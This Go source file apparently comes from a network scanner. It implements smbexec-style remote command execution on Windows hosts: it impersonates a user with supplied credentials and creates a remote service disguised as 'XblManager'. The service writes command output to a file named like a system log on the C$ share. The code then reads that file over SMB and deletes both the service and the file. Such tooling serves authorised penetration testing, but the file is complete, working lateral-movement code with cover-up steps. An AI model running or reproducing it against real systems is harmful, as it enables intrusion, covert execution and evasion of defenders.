package smbexec

import (
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"syscall"
	"unsafe"

	"github.com/404tk/lazyscan/common"
	"github.com/hirochachacha/go-smb2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

var (
	advapi32                 = syscall.NewLazyDLL("Advapi32.dll")
	pLogonUser               = advapi32.NewProc("LogonUserW")
	pImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
)

func SMBExec(info *common.HostInfo, user, pass, command string) string {
	runtime.LockOSThread()
	domain := "."
	err := logonUserToAccessSVM(domain, user, pass)
	if err != nil {
		log.Println(err)
		return ""
	}
	out, err := remoteExec(info.Host, info.Port, domain, user, pass, command)
	if err != nil {
		log.Println(err)
		return ""
	}
	runtime.UnlockOSThread()
	return out
}

func logonUserToAccessSVM(domain, user, pass string) error {
	var hToken syscall.Handle
	ok, err := logonUser(user, domain, pass, 9, 3, &hToken)
	if !ok {
		log.Println("[-] Logon User Failed")
		return err
	}
	worked, err := impersonateLoggedOnUser(windows.Token(hToken))
	if !worked {
		log.Println("[-] ImpersonateLoggedOnUser Failed")
		return err
	}
	return nil
}

func remoteExec(node, port, domain, user, pass, command string) (string, error) {
	err := createService(node, "XblManager", command)
	if err != nil {
		return "", err
	}
	err = deleteService(node, "XblManager")
	if err != nil {
		return "", err
	}
	payloadPath := `Users\Public\Documents\svc_host_log001.txt`
	data, err := readFileOnShare(node, port, user, pass, domain, "C$", payloadPath)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func createService(targetMachine, serviceName, commandToExec string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return errors.New("Failed to logon.")
	}
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	serviceBinary := fmt.Sprintf("%%COMSPEC%% /Q /c echo %s ^> \\\\127.0.0.1\\C$\\Users\\Public\\Documents\\svc_host_log001.txt 2^>^&1 > %%TMP%%\\svc_host_stderr.cmd & %%COMSPEC%% /Q /c %%TMP%%\\svc_host_stderr.cmd & del %%TMP%%\\svc_host_stderr.cmd", commandToExec)
	c.BinaryPathName = serviceBinary
	service, err := createServiceWithoutEscape(serviceMgr.Handle, serviceBinary, serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Start()
	return nil
}

func deleteService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Control(svc.Stop)
	err = service.Delete()
	if err != nil {
		return err
	}
	return nil
}

func createServiceWithoutEscape(handle windows.Handle, serviceBinaryPath, serviceStartName string) (*mgr.Service, error) {
	binPath := windows.StringToUTF16Ptr(serviceBinaryPath)
	startName := windows.StringToUTF16Ptr(serviceStartName)
	h, err := windows.CreateService(handle, startName, startName, windows.SERVICE_ALL_ACCESS, 0x00000010, mgr.StartManual, mgr.ErrorIgnore, binPath, nil, nil, nil, nil, windows.StringToUTF16Ptr(""))
	if err != nil {
		return nil, err
	}
	return &mgr.Service{Name: serviceStartName, Handle: h}, nil
}

func readFileOnShare(machine, port, user, pass, domain, shareName, fileToRead string) (string, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", machine, port))
	if err != nil {
		log.Println(err)
		return "", err
	}
	defer conn.Close()
	var d *smb2.Dialer
	d = &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: pass,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return "", err
	}
	defer s.Logoff()
	share, err := s.Mount(fmt.Sprintf("\\\\%s\\%s", machine, shareName))
	if err != nil {
		return "", err
	}
	defer share.Umount()
	f, err := share.Open(fileToRead)
	if os.IsNotExist(err) {
		return "", errors.New("File doesnt exist.")
	}
	f.Close()
	data, err := share.ReadFile(fileToRead)
	if err != nil {
		return "", err
	}
	err = share.Remove(fileToRead)
	if err != nil {
		return fmt.Sprintf("ERROR: %v Failed to delete file but still got output.\n%s", err, string(data)), nil
	}
	return string(data), nil
}

func logonUser(user string, domain string, password string, logonType uint32, logonProvider uint32, hToken *syscall.Handle) (bool, error) {
	userPtr := syscall.StringToUTF16Ptr(user)
	domainPtr := syscall.StringToUTF16Ptr(domain)
	passPtr := syscall.StringToUTF16Ptr(password)
	res, _, err := pLogonUser.Call(uintptr(unsafe.Pointer(userPtr)), uintptr(unsafe.Pointer(domainPtr)), uintptr(unsafe.Pointer(passPtr)), uintptr(logonType), uintptr(logonProvider), uintptr(unsafe.Pointer(hToken)))
	if res == 0 {
		return false, err
	}
	return true, nil
}

func impersonateLoggedOnUser(token windows.Token) (bool, error) {
	worked, _, err := pImpersonateLoggedOnUser.Call(uintptr(token))
	if worked == 0 {
		return false, err
	}
	return true, nil
}
